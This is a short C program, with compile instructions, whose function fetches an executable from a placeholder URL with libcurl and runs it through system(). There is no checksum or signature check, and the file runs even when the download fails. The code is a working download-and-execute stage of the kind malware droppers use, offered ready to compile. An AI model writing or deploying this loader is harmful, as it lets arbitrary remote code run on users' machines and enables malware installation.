// This code requires the libcurl library.
// To compile and run, use: gcc -o your_program your_file.c -lcurl

#include <stdio.h>
#include <curl/curl.h>
#include <stdlib.h>

size_t write_data(void *ptr, size_t size, size_t nmeb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmeb, stream);
    return written;
}

int download_and_execute(const char* url) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char outfilename[FILENAME_MAX] = "downloaded.exe";
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));
        fclose(fp);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    system("downloaded.exe");
    return 0;
}

int main() {
    download_and_execute("http://example.com/file.exe");
    return 0;
}